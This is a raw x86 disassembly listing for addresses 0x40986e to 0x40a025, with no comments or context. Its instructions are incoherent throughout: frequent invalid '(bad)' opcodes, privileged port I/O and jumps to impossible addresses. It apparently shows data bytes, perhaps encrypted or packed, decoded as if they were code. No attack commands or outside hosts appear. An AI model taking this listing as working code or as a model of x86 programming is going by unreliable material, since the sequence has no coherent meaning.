  40986e:	loope  0x409864
  409870:	clc    
  409871:	inc    esi
  409872:	xchg   esi,eax
  409873:	adc    DWORD PTR [edi],eax
  409875:	mov    al,0xe9
  409877:	jmp    0x8046f2fa
  40987c:	sub    al,0x3c
  40987e:	int    0xe2
  409880:	jno    0x4098cd
  409882:	pop    esi
  409883:	int    0x7e
  409885:	fbstp  TBYTE PTR ds:0x9bd94867
  40988b:	das    
  40988c:	cmp    DWORD PTR [eax],edi
  40988e:	push   0xfffffff5
  409890:	pushf  
  409891:	xchg   ebp,edi
  409893:	imul   esp,DWORD PTR [ebx],0x379bc4c9
  409899:	pop    esi
  40989a:	sub    DWORD PTR [edi],edx
  40989c:	outs   dx,DWORD PTR ds:[esi]
  40989d:	inc    esp
  40989e:	aaa    
  40989f:	mov    edi,0x2fb4a3df
  4098a4:	inc    ebp
  4098a5:	aas    
  4098a6:	add    eax,0x8d03ab4
  4098ab:	fisub  DWORD PTR [ebx]
  4098ad:	loopne 0x40986c
  4098af:	pop    ebp
  4098b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098b1:	xchg   esi,eax
  4098b2:	mov    al,0x84
  4098b4:	push   0x16603894
  4098b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098ba:	adc    eax,0x44114783
  4098bf:	das    
  4098c0:	in     eax,0x83
  4098c2:	jp     0x4098c4
  4098c4:	leave  
  4098c5:	repnz push ecx
  4098c7:	push   cs
  4098c8:	or     eax,0xc1d25d70
  4098cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098ce:	mov    ebp,DWORD PTR [ebx+0x1e7e2620]
  4098d4:	pop    esi
  4098d5:	or     al,0xf1
  4098d7:	mov    esp,0xf71d30df
  4098dc:	(bad)  
  4098dd:	(bad)  
  4098de:	push   ss
  4098df:	add    eax,0xc6b7e9d9
  4098e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098e5:	xor    DWORD PTR [eax],ebp
  4098e7:	lahf   
  4098e8:	(bad)  
  4098e9:	loopne 0x409877
  4098eb:	mov    ds:0xb4da20c4,eax
  4098f0:	and    DWORD PTR [ebp-0x26601568],eax
  4098f6:	fbld   TBYTE PTR [edi]
  4098f8:	pop    ecx
  4098f9:	mov    al,ds:0xac58cb04
  4098fe:	nop
  4098ff:	dec    eax
  409900:	and    eax,0x4e9373f2
  409905:	out    0x72,al
  409907:	sub    edx,0x58803db7
  40990d:	mov    cl,0x18
  40990f:	(bad)  
  409910:	cmp    al,0xfe
  409912:	loopne 0x4098fb
  409914:	fnstenv [edx-0x54bd23a0]
  40991a:	outs   dx,DWORD PTR ds:[esi]
  40991b:	xchg   edx,eax
  40991c:	data16 or dh,bh
  40991f:	(bad)  
  409920:	and    edi,ecx
  409922:	es in  al,dx
  409924:	out    dx,al
  409925:	jb     0x40998a
  409927:	aam    0x9f
  409929:	mov    ch,0x8e
  40992b:	scas   eax,DWORD PTR es:[edi]
  40992c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40992d:	out    dx,al
  40992e:	mov    edi,0x705451cf
  409933:	sbb    esp,DWORD PTR [ecx-0x45]
  409936:	pop    eax
  409937:	jmp    0x8473094b
  40993c:	sub    edi,esp
  40993e:	fbstp  TBYTE PTR [esi]
  409940:	int    0xcf
  409942:	jmp    0x40997e
  409944:	or     edi,DWORD PTR [ecx-0x27]
  409947:	out    0x3c,al
  409949:	dec    DWORD PTR [ecx]
  40994b:	xchg   esi,eax
  40994c:	icebp  
  40994d:	mov    ebp,0xb85145e7
  409952:	ret    0xe45b
  409955:	loopne 0x4098da
  409957:	(bad)  
  409958:	out    dx,al
  409959:	mov    BYTE PTR [ecx-0x624635dd],cl
  40995f:	sti    
  409960:	scas   al,BYTE PTR es:[edi]
  409961:	loopne 0x409961
  409963:	test   BYTE PTR [esp+esi*1-0x4],dh
  409967:	aad    0x5d
  409969:	pop    edi
  40996a:	mov    es,WORD PTR [eax+0x67]
  40996d:	in     eax,dx
  40996e:	mov    ss,WORD PTR [edx+0xe8e03c]
  409974:	add    al,0x88
  409976:	fs aad 0x33
  409979:	inc    ebp
  40997a:	sahf   
  40997b:	rcr    cl,0x50
  40997e:	daa    
  40997f:	sub    ch,BYTE PTR ds:0x642324c8
  409985:	sub    al,0x4f
  409987:	sub    dh,ch
  409989:	and    dh,bh
  40998b:	mov    eax,0xb89cda60
  409990:	jns    0x40991a
  409992:	mov    ecx,0xb18ded4
  409997:	inc    ebx
  409998:	test   DWORD PTR [ebp-0x266ddc2a],edx
  40999e:	in     al,0x27
  4099a0:	cmp    dh,BYTE PTR [edx+0x21e4e1cd]
  4099a6:	xchg   DWORD PTR [ebp+0x6b7b5d55],edx
  4099ac:	sbb    al,0x17
  4099ae:	iret   
  4099af:	ins    BYTE PTR es:[edi],dx
  4099b0:	ret    0xc814
  4099b3:	sti    
  4099b4:	int    0xdd
  4099b6:	xor    eax,0xb71ba5af
  4099bb:	pop    esp
  4099bc:	(bad)  
  4099bd:	jnp    0x409a21
  4099bf:	loopne 0x409a12
  4099c1:	int    0x6f
  4099c3:	cmp    ch,BYTE PTR [edi+eax*4+0x37b91f53]
  4099ca:	lock mov ds:0xf26cb9f1,al
  4099d0:	ret    0xa14d
  4099d3:	adc    cl,ah
  4099d5:	inc    ebx
  4099d6:	inc    ecx
  4099d7:	add    eax,0x810f0cc0
  4099dc:	mov    bh,0x54
  4099de:	and    edx,DWORD PTR [ecx+eax*1]
  4099e1:	nop
  4099e2:	or     eax,0x469c633b
  4099e7:	inc    edi
  4099e8:	inc    esi
  4099e9:	cli    
  4099ea:	cwde   
  4099eb:	out    dx,al
  4099ec:	xchg   BYTE PTR [edi],ch
  4099ee:	mov    cl,BYTE PTR [eax-0x2a]
  4099f1:	dec    esi
  4099f2:	mov    esp,0xc2506899
  4099f7:	retf   0x5ad2
  4099fa:	call   0x563d9700
  4099ff:	sub    BYTE PTR [ebp-0x2e],cl
  409a02:	mov    bl,0xe
  409a04:	mov    bh,0xe7
  409a06:	sbb    al,0x67
  409a08:	dec    ebx
  409a09:	pop    ebx
  409a0a:	push   cs
  409a0b:	cmp    ch,BYTE PTR [esp+edi*8+0x45]
  409a0f:	jo     0x409a58
  409a11:	mov    cl,0xa2
  409a13:	and    BYTE PTR [eax+esi*1+0xc],cl
  409a17:	pop    ecx
  409a18:	loopne 0x409a1f
  409a1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a1b:	inc    edx
  409a1c:	in     al,0xd0
  409a1e:	sbb    edx,0xfffffff9
  409a21:	es jae 0x409a33
  409a24:	or     ebx,esp
  409a26:	sbb    DWORD PTR [esi-0x68],edx
  409a29:	imul   esi,DWORD PTR [ecx],0x7d35b39b
  409a2f:	adc    bl,BYTE PTR [eax]
  409a31:	sbb    DWORD PTR [edx],0x7343aad3
  409a37:	daa    
  409a38:	int    0x13
  409a3a:	mov    dh,0xee
  409a3c:	add    dl,BYTE PTR [esi+0x432a5b16]
  409a42:	or     eax,0x71e09b67
  409a47:	out    dx,al
  409a48:	test   DWORD PTR [ebp-0x5d],0x599b5e14
  409a4f:	imul   eax,DWORD PTR [eax+0xff1be9c],0xffffffca
  409a56:	jns    0x409a34
  409a58:	push   ecx
  409a59:	frstor [esi+0x496dc6ef]
  409a5f:	sahf   
  409a60:	adc    DWORD PTR [eax],edx
  409a62:	inc    esi
  409a63:	out    0xdd,al
  409a65:	jge    0x409aa1
  409a67:	test   dl,0xce
  409a6a:	xchg   edi,eax
  409a6b:	inc    ebp
  409a6c:	daa    
  409a6d:	jl     0x409aeb
  409a6f:	mov    dl,0xa1
  409a71:	popa   
  409a72:	pop    ss
  409a73:	stc    
  409a74:	xchg   BYTE PTR [ebx+0x2a86c1d3],bh
  409a7a:	cmp    al,BYTE PTR [esp+ebx*1]
  409a7d:	imul   ebp,ebp,0xfffffffa
  409a80:	sbb    BYTE PTR [esi+0x11619948],ch
  409a86:	or     al,0xa1
  409a88:	jb     0x409a7b
  409a8a:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  409a8c:	jb     0x409aea
  409a8e:	mov    bl,0x9c
  409a90:	fbstp  TBYTE PTR [esi]
  409a92:	sti    
  409a93:	fbld   TBYTE PTR [eax+0x30]
  409a96:	call   0x78d3:0x82a60651
  409a9d:	test   DWORD PTR [edx-0x6a],esi
  409aa0:	sbb    al,BYTE PTR [ecx]
  409aa2:	test   al,0xca
  409aa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409aa5:	jbe    0x409acf
  409aa7:	test   eax,0xfd9767c1
  409aac:	repnz outs dx,DWORD PTR ds:[esi]
  409aae:	jb     0x409ab6
  409ab0:	push   ss
  409ab1:	sub    bl,0x18
  409ab4:	dec    ecx
  409ab5:	or     DWORD PTR [ebp+0x46],ebp
  409ab8:	xchg   edx,edi
  409aba:	jmp    0xe931f2cd
  409abf:	sub    esp,DWORD PTR ds:0xb0256e20
  409ac5:	jae    0x409afc
  409ac7:	or     BYTE PTR [ecx-0x35],dl
  409aca:	sub    dh,BYTE PTR [ecx-0x3b]
  409acd:	xor    al,0x12
  409acf:	imul   edi,ebp,0x420b932f
  409ad5:	test   eax,0x919d6379
  409ada:	rol    BYTE PTR [esi+edx*1-0x6b],1
  409ade:	fdivr  DWORD PTR [ecx+0x2b]
  409ae1:	imul   eax,DWORD PTR [edi],0x1b
  409ae4:	out    0xac,eax
  409ae6:	push   esp
  409ae7:	iret   
  409ae8:	pushw  es
  409aea:	sahf   
  409aeb:	ficomp WORD PTR [eax]
  409aed:	test   eax,0xb4173ab3
  409af2:	jg     0x409b36
  409af4:	iret   
  409af5:	push   0xffffffee
  409af7:	pop    ecx
  409af8:	add    BYTE PTR [edi-0x7c8c2c6a],ah
  409afe:	adc    al,0x6
  409b00:	jb     0x409abb
  409b02:	xor    al,0xe3
  409b04:	cmc    
  409b05:	cld    
  409b06:	rcr    DWORD PTR [esi*8+0x252a0cb9],cl
  409b0d:	xor    DWORD PTR [eax+eax*1-0x22],ecx
  409b11:	pop    edi
  409b12:	inc    edx
  409b13:	in     al,dx
  409b14:	mov    eax,0x16028c9c
  409b19:	outs   dx,DWORD PTR ds:[esi]
  409b1a:	add    ebx,DWORD PTR [esi]
  409b1c:	inc    ebx
  409b1d:	imul   esp,DWORD PTR [eax-0x72],0xfffffff7
  409b21:	aad    0x1d
  409b23:	call   0xfd26:0xc3caa5bc
  409b2a:	pop    edi
  409b2b:	mov    DWORD PTR [esi],ecx
  409b2d:	test   eax,0xb097b102
  409b32:	mov    bh,0x42
  409b34:	dec    esp
  409b35:	out    dx,al
  409b36:	jmp    0x27bf03cd
  409b3b:	inc    ebx
  409b3c:	mov    dl,0x8e
  409b3e:	jecxz  0x409afb
  409b40:	int    0x8c
  409b42:	fdivr  DWORD PTR [eax+0x47fdc390]
  409b48:	lds    edi,FWORD PTR [eax+ebp*8+0x36da3ab0]
  409b4f:	push   0x7a
  409b51:	push   es
  409b52:	sbb    DWORD PTR [ecx+0xb],0xb8425437
  409b59:	pop    ebx
  409b5a:	xchg   BYTE PTR [edx-0x3ba4b3bc],dh
  409b60:	clc    
  409b61:	mov    ebx,0xd07ac890
  409b66:	and    DWORD PTR [edi],0xbcfe9297
  409b6c:	xlat   BYTE PTR ds:[ebx]
  409b6d:	mov    ch,dl
  409b6f:	hlt    
  409b70:	fdiv   st(3),st
  409b72:	sbb    al,cl
  409b74:	or     al,0x48
  409b76:	mov    ah,0x39
  409b78:	xchg   edx,eax
  409b79:	mov    dl,0xdc
  409b7b:	mov    edi,0x861f43ea
  409b80:	jne    0x409b8d
  409b82:	lds    esp,FWORD PTR [esi-0x499881df]
  409b88:	adc    ch,al
  409b8a:	add    al,0x94
  409b8c:	xor    al,0x7
  409b8e:	ficomp DWORD PTR [eax]
  409b90:	sbb    al,0x8d
  409b92:	xor    eax,0xd9bbe8b5
  409b97:	popa   
  409b98:	add    dh,BYTE PTR [eax]
  409b9a:	(bad)  
  409b9b:	fimul  DWORD PTR [edx+0x2bee6ead]
  409ba1:	test   DWORD PTR [eax+0x1f4ee1d1],eax
  409ba7:	(bad)  
  409ba8:	mov    dl,0x23
  409baa:	pusha  
  409bab:	into   
  409bac:	leave  
  409bad:	sub    eax,0x1c0c4d32
  409bb2:	fcmovb st,st(5)
  409bb4:	pushf  
  409bb5:	pop    edx
  409bb6:	mov    ebp,0xb6ee3cda
  409bbb:	or     ebp,edi
  409bbd:	jle    0x409c3a
  409bbf:	sub    DWORD PTR [esi+0x76],0xffffffec
  409bc3:	add    eax,0x16dbb184
  409bc8:	xor    BYTE PTR [ebx+0x67368cb1],ah
  409bce:	sub    al,0x3d
  409bd0:	dec    ebp
  409bd1:	xor    bh,BYTE PTR [esi-0x57896a8d]
  409bd7:	pop    ebx
  409bd8:	inc    esi
  409bd9:	sub    dh,BYTE PTR [eax]
  409bdb:	test   eax,0x96f967cb
  409be0:	shl    BYTE PTR ds:0xc4bf6c3c,0x4d
  409be7:	mov    al,0xce
  409be9:	in     eax,0x82
  409beb:	mov    ds:0xe7a8aee1,al
  409bf0:	test   BYTE PTR [edx],ch
  409bf2:	fld    TBYTE PTR [edx+ebp*2+0x7a]
  409bf6:	pop    ebp
  409bf7:	add    cl,al
  409bf9:	loop   0x409be6
  409bfb:	jno    0x409c40
  409bfd:	dec    ecx
  409bfe:	inc    ebx
  409bff:	imul   eax,esi,0x2838c3af
  409c05:	int3   
  409c06:	(bad)  
  409c07:	mov    cl,0x68
  409c09:	mov    bl,ch
  409c0b:	mov    ecx,0x68ce4c69
  409c10:	xchg   BYTE PTR [ebx+0x6254f6d0],bh
  409c16:	icebp  
  409c17:	mov    ah,0x7f
  409c19:	scas   eax,DWORD PTR es:[edi]
  409c1a:	or     al,0xd6
  409c1c:	lds    esp,FWORD PTR [ebp+0x23]
  409c1f:	mov    bl,BYTE PTR [esi-0x2e]
  409c22:	dec    edi
  409c23:	and    BYTE PTR [ebx-0x33c15740],ch
  409c29:	push   es
  409c2a:	stos   BYTE PTR es:[edi],al
  409c2b:	dec    edi
  409c2c:	jecxz  0x409bd0
  409c2e:	cmp    DWORD PTR [ebx-0x3a7847d3],0x34bd6298
  409c38:	mov    dh,0x45
  409c3a:	sub    edi,eax
  409c3c:	imul   DWORD PTR [eax+esi*2-0x783f8bf6]
  409c43:	xor    ebx,DWORD PTR [ebp+0x73888d8c]
  409c49:	or     BYTE PTR [eax],0x7f
  409c4c:	ja     0x409c7a
  409c4e:	dec    edi
  409c4f:	lods   eax,DWORD PTR ds:[esi]
  409c50:	fstp   DWORD PTR [edi+0x4f43f46f]
  409c56:	pop    esp
  409c57:	cmp    ebp,edx
  409c59:	pop    es
  409c5a:	and    BYTE PTR [ebx],cl
  409c5c:	fsubp  st(1),st
  409c5e:	in     al,0xd
  409c60:	js     0x409cca
  409c62:	adc    ah,ch
  409c64:	add    esp,esp
  409c66:	push   es
  409c67:	cs jnp 0x409c5d
  409c6a:	push   edx
  409c6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c6c:	test   al,0xb1
  409c6e:	sub    al,0xa8
  409c70:	(bad)  
  409c71:	adc    DWORD PTR [ecx+0x3c733c96],eax
  409c77:	mov    ds:0x1f879e1a,eax
  409c7c:	push   esp
  409c7d:	adc    al,ch
  409c7f:	fwait
  409c80:	das    
  409c81:	lahf   
  409c82:	and    eax,0xc427b8a7
  409c87:	fsub   st(0),st
  409c89:	jno    0x409c2f
  409c8b:	das    
  409c8c:	in     al,dx
  409c8d:	lea    eax,[ebp-0xa]
  409c90:	popa   
  409c91:	jmp    0x45ec:0x9747df4e
  409c98:	shr    BYTE PTR [eax],cl
  409c9a:	cmp    ah,BYTE PTR [esi-0x6275fcdb]
  409ca0:	fsub   st(0),st
  409ca2:	push   0x1ad11a92
  409ca7:	fistp  WORD PTR [eax+edi*4-0x76]
  409cab:	ja     0x409d2a
  409cad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cae:	inc    ebp
  409caf:	fistp  QWORD PTR [esp+eax*8+0x2a]
  409cb3:	or     esp,edi
  409cb5:	mov    DWORD PTR [esp],ebx
  409cb8:	pop    esp
  409cb9:	dec    edx
  409cba:	out    0x2c,al
  409cbc:	add    ah,BYTE PTR [ebx-0x7249fd8f]
  409cc2:	xchg   ecx,eax
  409cc3:	aad    0xbc
  409cc5:	jmp    0x4c432fe9
  409cca:	pop    es
  409ccb:	(bad)  
  409ccc:	cmp    edx,edi
  409cce:	pop    edi
  409ccf:	xor    al,0x2d
  409cd1:	inc    ebp
  409cd2:	cmp    ebp,DWORD PTR ds:0x35c2bb36
  409cd8:	mov    al,0x67
  409cda:	push   edi
  409cdb:	jmp    0x409c9d
  409cdd:	and    al,0x57
  409cdf:	in     al,0x6a
  409ce1:	or     cl,bl
  409ce3:	pop    ecx
  409ce4:	xchg   ebp,eax
  409ce5:	(bad)  
  409ce6:	push   ebx
  409ce7:	icebp  
  409ce8:	sbb    esp,DWORD PTR [edx]
  409cea:	lock add DWORD PTR [edx+0x3f],ebp
  409cee:	sub    DWORD PTR [edi-0x44],ebx
  409cf1:	mul    DWORD PTR [ebx+0x33]
  409cf4:	add    DWORD PTR [edx+0x69a01b3d],0x28
  409cfb:	mov    BYTE PTR gs:[ecx+ebp*2-0x29],ch
  409d00:	fwait
  409d01:	test   BYTE PTR [ecx+0x209ee626],al
  409d07:	ins    DWORD PTR es:[edi],dx
  409d08:	cmp    al,0xf9
  409d0a:	out    dx,eax
  409d0b:	add    ebx,DWORD PTR [eax-0x6a]
  409d0e:	repnz pop edi
  409d10:	adc    eax,DWORD PTR [ebx-0x4c]
  409d13:	shl    DWORD PTR [eax+ebx*1-0x15272d11],0xd1
  409d1b:	arpl   WORD PTR [edx],di
  409d1d:	xor    eax,0x9039b28b
  409d22:	sbb    BYTE PTR [ebx],0x63
  409d25:	test   DWORD PTR [ecx-0x40],edx
  409d28:	sbb    eax,DWORD PTR [esi+0x1922f4f2]
  409d2e:	loope  0x409d37
  409d30:	jecxz  0x409d13
  409d32:	pop    esi
  409d33:	repnz cwde 
  409d35:	jnp    0x409d7d
  409d37:	cmp    eax,0x1373273c
  409d3c:	jp     0x409d65
  409d3e:	and    DWORD PTR [ebp+0x79],esi
  409d41:	pop    edi
  409d42:	ins    DWORD PTR es:[edi],dx
  409d43:	das    
  409d44:	stos   DWORD PTR es:[edi],eax
  409d45:	mov    BYTE PTR [esi-0x6aad4f2e],bh
  409d4b:	mov    eax,0xaad9cc64
  409d51:	in     eax,dx
  409d52:	jnp    0x409d11
  409d54:	or     DWORD PTR [ebp+0x4a],ecx
  409d57:	cmp    dh,BYTE PTR [edx+0xa625d74]
  409d5d:	stc    
  409d5e:	jns    0x409d1c
  409d60:	daa    
  409d61:	ret    0xc16d
  409d64:	test   DWORD PTR [ebp-0x4dc38da1],ebp
  409d6a:	test   eax,0x963c3c41
  409d6f:	je     0x409d84
  409d71:	dec    edx
  409d72:	sub    al,0x24
  409d74:	gs aas 
  409d76:	push   es
  409d77:	mov    dh,0xda
  409d79:	pop    ebp
  409d7a:	(bad)  
  409d7b:	shl    edi,1
  409d7d:	mov    ds:0x2ed83d4b,al
  409d82:	jne    0x409d25
  409d84:	gs jns 0x409dc9
  409d87:	mov    esp,0xe7b27352
  409d8c:	in     eax,dx
  409d8d:	lahf   
  409d8e:	jne    0x409d7f
  409d90:	or     DWORD PTR [ecx+0x622c484b],0xffffffef
  409d97:	sti    
  409d98:	inc    esp
  409d99:	push   ss
  409d9a:	ss push ebp
  409d9c:	(bad)  
  409d9d:	enter  0x2aac,0x75
  409da1:	cs xchg edx,eax
  409da3:	add    ah,bh
  409da5:	xchg   ebx,eax
  409da6:	dec    edx
  409da7:	cdq    
  409da8:	mov    eax,ds:0x34259cb9
  409dad:	cmp    ch,BYTE PTR [edi]
  409daf:	fnstsw WORD PTR [edx-0x7f]
  409db2:	push   esp
  409db3:	in     eax,dx
  409db4:	xchg   ecx,eax
  409db5:	lods   al,BYTE PTR ds:[esi]
  409db6:	std    
  409db7:	pop    esp
  409db8:	mov    cl,0x80
  409dba:	daa    
  409dbb:	pop    ss
  409dbc:	inc    esp
  409dbd:	jnp    0x409d95
  409dbf:	inc    eax
  409dc0:	dec    esi
  409dc1:	sar    DWORD PTR [esi+0x33],1
  409dc4:	mov    al,ds:0x285e073e
  409dc9:	jg     0x409de3
  409dcb:	retf   0xeaeb
  409dce:	jge    0x409e1a
  409dd0:	mov    cl,0xaf
  409dd2:	das    
  409dd3:	gs daa 
  409dd5:	call   FWORD PTR [esi+0x55]
  409dd8:	int    0x49
  409dda:	sbb    eax,0x3e42ce4
  409ddf:	xchg   BYTE PTR [ebp+0x2aedec3e],al
  409de5:	lahf   
  409de6:	xchg   ebp,eax
  409de7:	push   es
  409de8:	mov    eax,0xa6a10fa2
  409ded:	mov    gs,ebp
  409def:	test   DWORD PTR [esi+0x4a199f09],esp
  409df5:	gs out 0x44,al
  409df8:	xor    eax,0xf9fbf997
  409dfd:	cmc    
  409dfe:	sub    BYTE PTR [ebp+0x8],ch
  409e01:	jbe    0x409e53
  409e03:	stos   BYTE PTR es:[edi],al
  409e04:	jnp    0x409d8c
  409e06:	push   eax
  409e07:	add    ecx,ecx
  409e09:	adc    BYTE PTR [ebp+0x21],bl
  409e0c:	aam    0x21
  409e0e:	mov    ebx,0xdb97ca13
  409e13:	ficomp DWORD PTR ds:0xa154b2a0
  409e19:	mov    ds:0x35b0a80b,eax
  409e1e:	xchg   DWORD PTR [ebx],edx
  409e20:	mov    edi,0x672054c6
  409e25:	push   0xc3b00f7a
  409e2a:	lahf   
  409e2b:	dec    esp
  409e2c:	fistp  WORD PTR [edi]
  409e2e:	mov    bh,0xff
  409e30:	das    
  409e31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e32:	sub    al,0xac
  409e34:	push   es
  409e35:	adc    al,BYTE PTR [ebx]
  409e37:	push   esp
  409e38:	adc    ecx,DWORD PTR [eax+0x74]
  409e3b:	rcl    ecx,1
  409e3d:	shl    DWORD PTR [eax],0xa0
  409e40:	scas   al,BYTE PTR es:[edi]
  409e41:	mov    edx,DWORD PTR fs:[ebx+ebx*8-0x6b4dadc3]
  409e49:	bound  eax,QWORD PTR [edx+0x71c852a1]
  409e4f:	pop    es
  409e50:	pop    eax
  409e51:	mov    ecx,0xdb2852a1
  409e56:	inc    ebx
  409e57:	push   edx
  409e58:	test   DWORD PTR [edx],0xeb94fc69
  409e5e:	repz imul ecx,DWORD PTR [esi-0x9],0x7adf3be0
  409e66:	es pop edx
  409e68:	fnsave [ebx+ebx*1]
  409e6b:	rol    DWORD PTR [ecx],0x59
  409e6e:	mov    al,0x3b
  409e70:	mov    ch,0x41
  409e72:	add    BYTE PTR [edx+0x19],bh
  409e75:	mov    esi,0x6a8d8b93
  409e7a:	and    eax,0xc8ea9ffe
  409e7f:	mov    ah,0x19
  409e81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e82:	in     al,dx
  409e83:	aas    
  409e84:	inc    ecx
  409e85:	fidiv  WORD PTR [ebp+0x344fe347]
  409e8b:	fstp   TBYTE PTR ds:0x23c9781b
  409e91:	cdq    
  409e92:	popf   
  409e93:	sahf   
  409e94:	popf   
  409e95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e96:	mov    ecx,0x3c1a268d
  409e9b:	jb     0x409ebd
  409e9d:	inc    edi
  409e9e:	dec    esi
  409e9f:	push   ebx
  409ea0:	imul   esp,DWORD PTR [ecx],0x68
  409ea3:	sub    eax,edi
  409ea5:	pop    ebx
  409ea6:	xchg   ebx,eax
  409ea7:	sbb    BYTE PTR [ebp-0xc],ah
  409eaa:	cs sub al,0x3
  409ead:	pop    eax
  409eae:	fmul   st,st(5)
  409eb0:	(bad)  
  409eb1:	arpl   WORD PTR [edi-0x4635a135],sp
  409eb7:	pop    eax
  409eb8:	in     eax,0x49
  409eba:	mov    eax,0x8af75ec9
  409ebf:	and    edi,DWORD PTR [eax]
  409ec1:	mov    DWORD PTR [eax-0x6f],edi
  409ec4:	lods   eax,DWORD PTR ds:[esi]
  409ec5:	xchg   esp,eax
  409ec6:	(bad)  
  409ec7:	jns    0x409f04
  409ec9:	push   esi
  409eca:	add    al,0x29
  409ecc:	adc    eax,0x20900409
  409ed1:	(bad)  
  409ed2:	mov    bl,0x74
  409ed4:	xor    dl,al
  409ed6:	ret    
  409ed7:	or     DWORD PTR [edi],edx
  409ed9:	cmp    BYTE PTR [edi+0xd7fa431],bh
  409edf:	imul   edi,DWORD PTR [eax+eax*1],0x3c87e8fa
  409ee6:	add    DWORD PTR [esi],ebp
  409ee8:	imul   esp,DWORD PTR [esi],0x134e8bd7
  409eee:	daa    
  409eef:	shr    bl,0x55
  409ef2:	adc    ch,cl
  409ef4:	pop    ecx
  409ef5:	xchg   ecx,eax
  409ef6:	add    al,0x7a
  409ef8:	push   edx
  409ef9:	push   edi
  409efa:	jbe    0x409f5e
  409efc:	dec    esi
  409efd:	push   esi
  409efe:	test   al,0xc0
  409f00:	pop    edi
  409f01:	xchg   ecx,eax
  409f02:	cmp    ecx,ecx
  409f04:	add    al,0xe4
  409f06:	jb     0x409ee6
  409f08:	and    BYTE PTR [ebx-0x77],0xcc
  409f0c:	test   al,0x43
  409f0e:	xlat   BYTE PTR ds:[ebx]
  409f0f:	add    al,0x59
  409f11:	cmp    dh,cl
  409f13:	sbb    bl,bl
  409f15:	test   BYTE PTR [ebp-0x49],dh
  409f18:	pop    ss
  409f19:	test   DWORD PTR [eax+0x28],eax
  409f1c:	pusha  
  409f1d:	and    DWORD PTR [edx-0x51],edi
  409f20:	mov    ds:0x10cfaa,al
  409f25:	fsubp  st(6),st
  409f27:	fstp   QWORD PTR [edi-0x21]
  409f2a:	call   0x98aa6b28
  409f2f:	sbb    eax,0x48be637c
  409f34:	inc    ecx
  409f35:	mov    ds:0xcba043e5,al
  409f3a:	inc    esp
  409f3b:	mov    esp,0xaf63269f
  409f40:	hlt    
  409f41:	mov    WORD PTR [edi-0xb],ss
  409f44:	mov    al,0xe0
  409f46:	mov    ds:0xe4c1af7a,al
  409f4b:	xor    eax,0xb6821b84
  409f50:	sbb    dl,BYTE PTR [esi+0x9eeeb54]
  409f56:	rcl    BYTE PTR [edi+0x528e5a0b],0x16
  409f5d:	sub    ecx,edi
  409f5f:	sub    eax,0xacaf2b46
  409f64:	xor    BYTE PTR [ecx],bl
  409f66:	outs   dx,BYTE PTR ds:[esi]
  409f67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f68:	inc    edx
  409f69:	jp     0x409f17
  409f6b:	jp     0x409f1a
  409f6d:	inc    esi
  409f6e:	fcmove st,st(5)
  409f70:	imul   ecx,edi,0xffffffc5
  409f73:	push   edi
  409f74:	fs hlt 
  409f76:	jle    0x409f2c
  409f78:	jmp    0x40ec:0x356e3a0b
  409f7f:	jbe    0x409f02
  409f81:	jns    0x409f26
  409f83:	mov    ds,WORD PTR [edx-0x42]
  409f86:	add    DWORD PTR [ebx+ecx*4],ecx
  409f89:	dec    ebx
  409f8a:	ins    BYTE PTR es:[edi],dx
  409f8b:	loope  0x40a005
  409f8d:	sub    BYTE PTR [edx+0x45e0f42a],ah
  409f93:	push   0xffffffb3
  409f95:	clc    
  409f96:	cld    
  409f97:	pusha  
  409f98:	push   ss
  409f99:	xor    cl,BYTE PTR [ecx+0x47]
  409f9c:	and    esp,DWORD PTR [edx]
  409f9e:	cmp    dh,BYTE PTR [edx]
  409fa0:	test   al,0x80
  409fa2:	out    dx,al
  409fa3:	loop   0x409fa4
  409fa5:	cld    
  409fa6:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  409fa8:	jle    0x409f6a
  409faa:	ret    
  409fab:	dec    edx
  409fac:	and    eax,0xe0d17e4
  409fb1:	mov    edi,0xb3cc31b6
  409fb6:	pop    ebx
  409fb7:	xor    esp,DWORD PTR [ebx-0x66290de1]
  409fbd:	cmp    BYTE PTR [edx-0x70ebfc10],0x4e
  409fc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fc5:	imul   eax,DWORD PTR [edx+0x45b38f2c],0xd1cd092b
  409fcf:	xor    ebp,DWORD PTR [esi+esi*1+0x19]
  409fd3:	std    
  409fd4:	or     DWORD PTR [ebx],ebx
  409fd6:	inc    eax
  409fd7:	fcmovnbe st,st(3)
  409fd9:	jg     0x40a02f
  409fdb:	scas   eax,DWORD PTR es:[edi]
  409fdc:	pop    ds
  409fdd:	(bad)  
  409fde:	mov    dh,0x1e
  409fe0:	pop    eax
  409fe1:	pop    ebx
  409fe2:	dec    edi
  409fe3:	or     DWORD PTR [ecx-0x3ce848e5],edi
  409fe9:	mov    bh,0x56
  409feb:	fs std 
  409fed:	inc    edx
  409fee:	adc    ah,al
  409ff0:	in     eax,0x74
  409ff2:	jnp    0x409fe7
  409ff4:	lock (bad) [bx-0x173]
  409ffa:	cli    
  409ffb:	(bad)  
  409ffc:	gs loop 0x40a040
  409fff:	in     al,0x5d
  40a001:	sbb    dl,BYTE PTR [eax+0x3f]
  40a004:	xor    BYTE PTR [ebx+0x4378c287],dh
  40a00a:	gs pop eax
  40a00c:	push   esp
  40a00d:	into   
  40a00e:	scas   al,BYTE PTR es:[edi]
  40a00f:	outs   dx,DWORD PTR ds:[esi]
  40a010:	inc    eax
  40a011:	(bad)  
  40a013:	sbb    al,0xd5
  40a015:	sub    DWORD PTR [eax+0x4b],edx
  40a018:	xchg   esi,eax
  40a019:	cmp    eax,0xee684a84
  40a01e:	dec    eax
  40a01f:	cmp    DWORD PTR [ebp-0x14547688],edi
  40a025:	in     al,0xaa
